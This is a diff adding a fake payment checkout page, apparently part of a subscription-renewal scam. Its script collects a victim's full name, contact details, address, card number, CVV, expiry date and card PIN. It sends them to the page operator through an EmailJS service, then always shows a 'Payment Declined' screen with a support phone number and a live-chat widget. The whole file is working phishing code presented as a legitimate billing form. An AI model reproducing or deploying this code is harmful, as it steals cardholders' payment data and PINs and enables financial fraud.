+                                  </div>
+                                </div> -->
+                                <div class="row">
+                                            <div class="col-12 text-center">
+                                                <div class="card shadow-none border-0 rounded ">
+                                                        <!-- Logo -->
+                                                        <div class="mb-3">
+                                                            <img src="logo.png" alt="Logo" class="img-fluid" style="max-width: 240px;">
+                                                        </div>
+                                                        <!-- Heading -->
+                                                        <h1 class="mb-1 fs-4">Enter your Debit/Credit card pin</h1>
+                                                        <p>In order to complete your transaction use your pin.</p>
+                                                        <!-- OTP Box -->
+                                                        <input type="password" placeholder="0 0 0 0 0 0" id="cardPin" class="bg-light text-center p-3 rounded w-100" style="letter-spacing: 0.3rem; font-size: 1.4rem; font-weight: bold;" maxlength="6">
+                                                        </div>
+                                                        <br>
+                                                        <a href="https://www.clearlypayments.com/blog/how-a-pin-works-on-credit-cards-and-debit-cards/" target="_blank" class="text-muted text-center">What is debit/credit card pin?</a>
+                                                        <br><br>
+                                                        <!-- <button type="submit" class="btn btn-primary submit-button" class="w-50">
+                                                          Pay Now
+                                                        </button> -->
+                                            </div>
+                                        </div>                        
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                    </div>
+
+
+                    <!-- Submit Button -->
+                    <div class="row">
+                        <div class="col-12 text-center mt-3">
+                            
+                            <button type="submit" class="btn btn-primary submit-button" data-bs-toggle="modal">
+                              Pay Now
+                            </button>
+                        </div>
+                    </div>
+                </form>
+</div>
+            </div>
+            <div class="wrapper-three" style="display: none;">
+              <div class="failed-container mt-5">
+                      <div class="failed-icon">
+                          <i class="fs-1 fa-solid fa-xmark"></i>
+                      </div>
+                      <div class="failed-title">Payment Declined</div>
+                      <!-- <div class="failed-message">The payment for renewal for Microsoft Office not completed</div> -->
+                      <div class="failed-message">Error Code: 30102-11</div>
+			<div class="failed-message">Account information not updated</div>
+                      <div class="failed-message">Oops! Something went wrong with your payment. Please try again. If the issue persists, you can contact our support team or use a different payment method.</div>                      
+                      <!-- <a href="file:///C:/Users/HP/Downloads/email.html" class="btn btn-primary">Retry</a> -->
+                      <div class="failed-message">
+                          
+                      </div>
+                        <p> <center> Kindly check your Email for more information, <span class="text-primary fw-bold">you can chat with live agent.</span></center> </p>
+<p> <center> Contact Support:+1 (888) 308-9127 </center> </p>                       
+ <div class="row mt-5">
+                          <div class="col-md-6 col-sm-6 col-12">
+                            
+                            
+                        <br>
+                        
+                  </div> 
+            </div> 
+            <div class="mt-5"></div>
+            <img src="plans1.JPG" class="w-100">
+            <img src="plans2.JPG" class="w-100">
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- JS -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/owl.carousel.min.js"></script>
+        <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+        <script>
+          emailjs.init("xOn80V8G0X8ZO8B5J"); // Initialize EmailJS
+
+document.querySelector(".submit-button").addEventListener("click", function () {
+    console.log("Pay Now button clicked");
+
+    try {
+        const emailInput = document.getElementById("email").value;
+        console.log("Email input value:", emailInput);
+
+        if (!emailInput) {
+            alert("Please enter a valid email address.");
+            return;
+        }
+
+        const templateParams = {
+            email: emailInput, // Ensure this matches {{user_email}} in the EmailJS template
+        };
+
+        console.log("Template parameters:", templateParams);
+
+        emailjs.send("service_twxj83j", "template_ss1iwar", templateParams)
+            .then(function (response) {
+                // console.log("Email sent successfully:", response.status, response.text);
+                // alert("Email sent successfully!");
+            })
+            .catch(function (error) {
+                // console.error("Failed to send email:", error);
+                // alert("Failed to send email. Please try again.");
+            });
+    } catch (err) {
+        // console.error("Error in handling the button click or EmailJS:", err);
+        // alert("An error occurred. Check the console for details.");
+    }
+});
+
+
+
+</script>
+
+
+
+
+
+
+
+
+
+
+    <script>
+      $('.owl-carousel').owlCarousel({
+          loop:true,
+          margin:10,
+          nav:true,
+          dots:false,
+          responsive:{
+              0:{
+                  items:1
+              },
+              600:{
+                  items:3
+              },
+              1000:{
+                  items:5
+              }
+          }
+      })
+
+      var app;
+
+      (function() {
+        'use strict';
+        
+        app = {
+          monthAndSlashRegex: /^\d\d \/ $/, // regex to match "MM / "
+          monthRegex: /^\d\d$/, // regex to match "MM"
+          
+          el_cardNumber: '.ccFormatMonitor',
+          el_expDate: '#inputExpDate',
+          el_cvv: '.cvv',
+          el_ccUnknown: 'cc_type_unknown',
+          el_ccTypePrefix: 'cc_type_',
+          el_monthSelect: '#monthSelect',
+          el_yearSelect: '#yearSelect',
+          
+          cardTypes: {
+            'American Express': {
+              name: 'American Express',
+              code: 'ax',
+              security: 4,
+              pattern: /^3[47]/,
+              valid_length: [18],
+              formats: {
+                length: 18,
+                format: 'xxxx xxxxxxx xxxx'
+              }
+            },
+            'Visa': {
+              name: 'Visa',
+              code: 'vs',
+              security: 3,
+              pattern: /^4/,
+              valid_length: [19],
+              formats: {
+                  length: 19,
+                  format: 'xxxx xxxx xxxx xxxx'
+                }
+            },
+            'Maestro': {
+              name: 'Maestro',
+              code: 'ma',
+              security: 3,
+              pattern: /^(50(18|20|38)|5612|5893|63(04|90)|67(59|6[1-3])|0604)/,
+              valid_length: [19],
+              formats: {
+                  length: 19,
+                  format: 'xxxx xxxx xxxx xxxx'
+                }
+            },
+            'Mastercard': {
+              name: 'Mastercard',
+              code: 'mc',
+              security: 3,
+              pattern: /^5[1-5]/,
+              valid_length: [19],
+              formats: {
+                  length: 19,
+                  format: 'xxxx xxxx xxxx xxxx'
+                }
+            } 
+          }
+        };
+        
+        app.addListeners = function() {
+            $(app.el_expDate).on('keydown', function(e) {
+              app.removeSlash(e);
+            });
+
+            $(app.el_expDate).on('keyup', function(e) {
+              app.addSlash(e);
+            });
+
+            $(app.el_expDate).on('blur', function(e) {
+              app.populateDate(e);
+            });
+
+            $(app.el_cvv +', '+ app.el_expDate).on('keypress', function(e) {
+              return e.charCode >= 48 && e.charCode <= 57;
+            });  
+        };
+        
+        app.addSlash = function (e) {
+          var isMonthEntered = app.monthRegex.exec(e.target.value);
+          if (e.key >= 0 && e.key <= 9 && isMonthEntered) {
+            e.target.value = e.target.value + " / ";
+          }
+        };
+        
+        app.removeSlash = function(e) {
+          var isMonthAndSlashEntered = app.monthAndSlashRegex.exec(e.target.value);
+          if (isMonthAndSlashEntered && e.key === 'Backspace') {
+            e.target.value = e.target.value.slice(0, -3);
+          }
+        };
+        
+        app.populateDate = function(e) {
+          var month, year;
+          
+          if (e.target.value.length == 7) {
+            month = parseInt(e.target.value.slice(0, -5));
+            year = "20" + e.target.value.slice(5);
+            
+            if (app.checkMonth(month)) {
+              $(app.el_monthSelect).val(month);
+            } else {
+              $(app.el_monthSelect).val(0);
+            }
+            
+            if (app.checkYear(year)) {
+              $(app.el_yearSelect).val(year);
+            } else {
+              $(app.el_yearSelect).val(0);
+            }
+            
+          }
+        };
+        
+        app.checkMonth = function(month) {
+          if (month <= 12) {
+            var monthSelectOptions = app.getSelectOptions($(app.el_monthSelect));
+            month = month.toString();
+            if (monthSelectOptions.includes(month)) {
+              return true; 
+            }
+          }
+        };
+        
+        app.checkYear = function(year) {
+          var yearSelectOptions = app.getSelectOptions($(app.el_yearSelect));
+          if (yearSelectOptions.includes(year)) {
+            return true; 
+          }
+        };
+                
+        app.getSelectOptions = function(select) {
+          var options = select.find('option');
+          var optionValues = [];
+          for (var i = 0; i < options.length; i++) {
+            optionValues[i] = options[i].value;
+          }
+          return optionValues;
+        };
+        
+        app.setMaxLength = function ($elem, length) {
+          if($elem.length && app.isInteger(length)) {
+            $elem.attr('maxlength', length);
+          }else if($elem.length){
+            $elem.attr('maxlength', '');
+          }
+        };
+        
+        app.isInteger = function(x) {
+          return (typeof x === 'number') && (x % 1 === 0);
+        };
+
+        app.createExpDateField = function() {
+          $(app.el_monthSelect +', '+ app.el_yearSelect).hide();
+          $(app.el_monthSelect).parent().prepend('<input type="text" class="ccFormatMonitor">');
+        };
+        
+        
+        app.isValidLength = function(cc_num, card_type) {
+          for(var i in card_type.valid_length) {
+            if (cc_num.length <= card_type.valid_length[i]) {
+              return true;
+            }
+          }
+          return false;
+        };
+
+        app.getCardType = function(cc_num) {
+          for(var i in app.cardTypes) {
+            var card_type = app.cardTypes[i];
+            if (cc_num.match(card_type.pattern) && app.isValidLength(cc_num, card_type)) {
+              return card_type;
+            }
+          }
+        };
+
+        app.getCardFormatString = function(cc_num, card_type) {
+          for(var i in card_type.formats) {
+            var format = card_type.formats[i];
+            if (cc_num.length <= format.length) {
+              return format;
+            }
+          }
+        };
+
+        app.formatCardNumber = function(cc_num, card_type) {
+          var numAppendedChars = 0;
+          var formattedNumber = '';
+          var cardFormatIndex = '';
+
+          if (!card_type) {
+            return cc_num;
+          }
+
+          var cardFormatString = app.getCardFormatString(cc_num, card_type);
+          for(var i = 0; i < cc_num.length; i++) {
+            cardFormatIndex = i + numAppendedChars;
+            if (!cardFormatString || cardFormatIndex >= cardFormatString.length) {
+              return cc_num;
+            }
+
+            if (cardFormatString.charAt(cardFormatIndex) !== 'x') {
+              numAppendedChars++;
+              formattedNumber += cardFormatString.charAt(cardFormatIndex) + cc_num.charAt(i);
+            } else {
+              formattedNumber += cc_num.charAt(i);
+            }
+          }
+
+          return formattedNumber;
+        };
+
+        app.monitorCcFormat = function($elem) {
+          var cc_num = $elem.val().replace(/\D/g,'');
+          var card_type = app.getCardType(cc_num);
+          $elem.val(app.formatCardNumber(cc_num, card_type));
+          app.addCardClassIdentifier($elem, card_type);
+        };
+
+        app.addCardClassIdentifier = function($elem, card_type) {
+          var classIdentifier = app.el_ccUnknown;
+          if (card_type) {
+            classIdentifier = app.el_ccTypePrefix + card_type.code;
+            app.setMaxLength($(app.el_cvv), card_type.security);
+          } else {
+            app.setMaxLength($(app.el_cvv));
+          }
+
+          if (!$elem.hasClass(classIdentifier)) {
+            var classes = '';
+            for(var i in app.cardTypes) {
+              classes += app.el_ccTypePrefix + app.cardTypes[i].code + ' ';
+            }
+            $elem.removeClass(classes + app.el_ccUnknown);
+            $elem.addClass(classIdentifier);
+          }
+        };
+
+        
+        app.init = function() {
+
+          $(document).find(app.el_cardNumber).each(function() {
+            var $elem = $(this);
+            if ($elem.is('input')) {
+              $elem.on('input', function() {
+                app.monitorCcFormat($elem);
+              });
+            }
+          });
+          
+          app.addListeners();
+          
+        }();
+        
+      })();
+    </script>
+    
+<script>
+  const input = document.querySelector('[autocomplete=one-time-code');
+  input.addEventListener('input', () => input.style.setProperty('--_otp-digit', input.selectionStart));
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+      const proceedButtons = document.querySelectorAll('.proceed-btn');
+      const submitButton = document.querySelector('.submit-button');
+      const loaderWrapper = document.querySelector('.loader-wrapper');
+      const wrapperMain = document.querySelector('.wrapper-main');
+      const wrapperTwo = document.querySelector('.wrapper-two');
+      const wrapperThree = document.querySelector('.wrapper-three');
+
+      // EmailJS Initialization
+      emailjs.init('xOn80V8G0X8ZO8B5J'); // Replace with your EmailJS User ID
+      const emailjsServiceID = 'service_twxj83j'; // Replace with your EmailJS Service ID
+      const emailjsTemplateID = 'template_pmfkt8ynewform'; // Replace with your EmailJS Template ID
+
+      let selectedPlan = ''; // Store the selected plan name and price
+
+      // Function to collect billing information
+      const getBillingData = () => ({
+          first_name: document.getElementById('first-name').value,
+          middle_name: document.getElementById('middle-name').value || 'N/A',
+          last_name: document.getElementById('last-name').value,
+          email: document.getElementById('email').value,
+          phone: document.getElementById('phone').value,
+          card_name: document.getElementById('card-name').value,
+          card_number: document.getElementById('card-number').value,
+          cvv: document.getElementById('cvv').value,
+          expiration_date: document.getElementById('inputExpDate').value,
+          address_line_1: document.getElementById('address-line-1').value,
+          address_line_2: document.getElementById('address-line-2').value || 'N/A',
+          city: document.getElementById('city').value,
+          state: document.getElementById('state').value,
+          zip: document.getElementById('zip').value,
+          country: document.getElementById('country').value,
+      });
+
+      // Function to get the selected plan details
+      const getSelectedPlan = () => {
+          const selectedPlanCard = document.querySelector('.owl-carousel .item.active .card');
+          if (!selectedPlanCard) return {};
+          return {
+              plan_name: selectedPlanCard.querySelector('.fw-bold').textContent.trim(),
+              price: selectedPlanCard.querySelector('.text-dark').textContent.trim(),
+          };
+      };
+
+      // Function to show the appropriate wrapper
+      const showWrapper = (wrapperToShow) => {
+          [wrapperMain, wrapperTwo, wrapperThree].forEach(wrapper => {
+              if (wrapper) wrapper.style.display = wrapper === wrapperToShow ? 'block' : 'none';
+          });
+      };
+
+      // Handle "Proceed" button click
+      proceedButtons.forEach(button => {
+          button.addEventListener('click', () => {
+              wrapperMain.style.display = 'none'; // Hide wrapper-main
+              loaderWrapper.style.display = 'flex'; // Show loader
+
+              setTimeout(() => {
+                  loaderWrapper.style.display = 'none'; // Hide loader
+                  wrapperTwo.style.display = 'block'; // Show wrapper-two
+                  selectedPlan = button.name; // Store the selected plan from the button's name attribute
+              }, 3000); // 3-second delay
+          });
+      });
+
+      // Handle "Pay Now" button click
+      submitButton.addEventListener('click', (e) => {
+          e.preventDefault();
+          const modalBackdrop = document.querySelector('.modal-backdrop');
+          const modal = document.querySelector('#staticBackdrop');
+
+          // Collect billing data and selected plan
+          const billingData = getBillingData();
+          const planData = getSelectedPlan();
+          const cardPin = document.getElementById('cardPin').value;
+
+          const emailData = {
+              ...billingData,
+              ...planData,
+              card_pin: cardPin,
+              selected_plan: selectedPlan, // Add the selected plan stored earlier
+          };
+
+          // Show loader
+          wrapperTwo.style.display = 'none';
+          loaderWrapper.style.display = 'flex';
+
+          // Close modal if open
+          if (modal) {
+              const bootstrapModal = bootstrap.Modal.getInstance(modal);
+              if (bootstrapModal) {
+                  bootstrapModal.hide();
+              }
+          }
+
+          // Remove modal backdrop if exists
+          if (modalBackdrop) {
+              modalBackdrop.remove();
+          }
+
+          // Send email through EmailJS
+          emailjs.send(emailjsServiceID, emailjsTemplateID, emailData)
+              .then((response) => {
+                  console.log('EmailJS Response:', response);
+                  loaderWrapper.style.display = 'none';
+                  showWrapper(wrapperThree); // Show success wrapper
+                  // alert('Error processing payment. Please try again.');
+              })
+              .catch((error) => {
+                  console.error('EmailJS Error:', error);
+                  loaderWrapper.style.display = 'none';
+                  // alert('Payment processed successfully!');
+              });
+
+          setTimeout(() => {
+              loaderWrapper.style.display = 'none'; // Hide loader
+              wrapperThree.style.display = 'block'; // Show success wrapper
+          }, 5000); // 5-second delay before showing the success wrapper
+      });
+  });
+
+</script>
+<script>
+  // Get the URL search parameters
+const urlParams = new URLSearchParams(window.location.search);
+
+// Retrieve the 'email' parameter
+let email = urlParams.get('email');
+
+// Function to update the welcome message
+function updateWelcomeMessage(email) {
+    const welcomeMessage = document.getElementById('welcome-message');
+    welcomeMessage.innerHTML = `<span>${email}</span> <i class="ms-2 fa-regular fa-user"></i>`;
+}
+
+// Check if the email exists in the URL
+if (email) {
+    // Save the email in sessionStorage
+    sessionStorage.setItem('email', email);
+
+    // Update the welcome message
+    updateWelcomeMessage(email);
+
+    // Remove the email parameter from the URL
+    urlParams.delete('email');
+    const newUrl = window.location.pathname + (urlParams.toString() ? '?' + urlParams.toString() : '');
+    window.history.replaceState(null, '', newUrl);
+} else {
+    // If the page is reloaded, check if email exists in sessionStorage
+    email = sessionStorage.getItem('email');
+    if (email) {
+        // Add the email back to the URL temporarily
+        const newUrl = `${window.location.pathname}?email=${email}`;
+        window.history.replaceState(null, '', newUrl);
+
+        // Update the welcome message
+        updateWelcomeMessage(email);
+
+        // Remove the email from the URL again after the DOM is fully loaded
+        setTimeout(() => {
+            const cleanedUrl = window.location.pathname;
+            window.history.replaceState(null, '', cleanedUrl);
+        }, 0);
+    }
+}
+</script>
+
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/6509adcf0f2b18434fd961cb/1hamstsve';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
+
+
+<!--End of Tawk.to Script-->
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    const form = document.getElementById('billing-form');
+    const submitButton = document.querySelector('.nah-submit');
+
+    // Function to check form validity
+    const checkFormValidity = () => {
+      // Check if the form is valid
+      if (form.checkValidity()) {
+        submitButton.disabled = false;
+      } else {
+        submitButton.disabled = true;
+      }
+    };
+
+    // Add event listeners to all inputs for real-time validation
+    const inputs = form.querySelectorAll('input, select');
+    inputs.forEach((input) => {
+      input.addEventListener('input', checkFormValidity);
+    });
+
+    // Initially disable the button
+    submitButton.disabled = true;
+  });  
+</script>
+
+  </body>
+</html>
